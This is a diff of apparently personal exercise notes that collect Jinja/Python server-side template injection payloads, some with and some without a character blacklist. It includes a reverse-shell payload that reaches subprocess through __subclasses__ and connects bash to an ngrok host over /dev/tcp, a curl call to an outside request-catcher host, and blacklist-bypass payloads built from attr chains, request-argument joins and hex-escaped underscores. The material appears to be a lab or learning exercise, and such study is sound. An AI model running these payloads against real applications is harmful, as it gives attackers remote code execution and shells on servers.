@@ -1,13 +1,4 @@
-Task:
-
-Give unique ssti payloads for the given cases while following these conditions:
-payloads must be as unique as possible ie if one starts with class.base.subclasses none others should start with it
-OR you can use some other variant of the same payload like attr getattr instead of dot notation but again with these there should be at max two payloads looking similar
-
-include the outputs of each part of payload eg for class.base.subclasses do class, then class.base and so on.
-screenshots once in 5 paras but don't clutter them all around
-
-Without blacklist:
+<h1>Without blacklist:</h1>
 
 1) return the index of urllib in subclasses()
 ```
@@ -110,16 +101,17 @@ c:\Users\risha\Rishabh extras\Programming\ssti.py
 
 
 7) rev shell
-
+```
 ().__class__.__base__.__subclasses__()[258]('bash -c ‘exec bash -i &>/dev/tcp/<ngrok_IP>/<ngrok_port> <&1’', shell=True, stdout=-1).communicate()
 Tried this ().__class__.__base__.__subclasses__()[259]('curl a.requestcatcher.com', shell=True, stdout=-1).communicate() and it works.
  Just have to figure out how to get it to connect to ngrok
+```
 
-Blacklist applied:
+<h1>Blacklist applied:</h1>
 
-1){{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
+1)
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
 {{request|attr(request.query_string[2:12].decode())|attr(request.query_string[15:23].decode())?c=__class__&d=__base__}}
-
 
 Without ' or " constructing payloads is very difficult. It leaves very few options as far as I understand like the example one.
 2){{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
